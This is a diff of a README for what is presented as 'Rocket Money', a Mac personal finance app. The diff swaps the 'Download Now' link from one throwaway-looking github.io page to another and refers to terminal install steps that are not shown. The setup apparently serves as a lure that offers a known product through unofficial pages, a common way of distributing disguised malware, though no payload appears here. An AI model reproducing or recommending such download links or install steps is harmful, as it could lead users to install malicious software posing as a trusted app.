@@ -4,7 +4,7 @@
 
 Rocket Money is a modern personal finance assistant for Mac that helps you track spending, manage budgets, and stay on top of subscriptions — installable following the easy steps below. 🚀
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://kamartamara.github.io/.github/rocket-money)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://tayusikf8398.github.io/.github/rocket-money)
 
 If the button above doesn't work, follow the terminal install instructions further below.
 
